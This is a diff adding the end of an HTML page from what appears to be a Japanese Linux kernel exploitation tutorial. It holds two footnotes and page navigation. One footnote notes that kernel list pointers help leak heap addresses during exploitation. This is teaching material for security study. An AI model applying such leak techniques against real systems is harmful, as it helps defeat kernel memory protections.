+<li id="fn2" class="footnote-item"><p>これはLinuxが提供する双方向リストのポインタです。mutexなどを利用すると作られるためカーネル中の多くのオブジェクトに存在し、ヒープアドレスリークに役立ちます。 <a href="#fnref2" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn3" class="footnote-item"><p>その変数を使う関数を逆アセンブルしてアドレスを特定する方法もあります。 <a href="#fnref3" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="stack_overflow.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="use_after_free.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2022 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
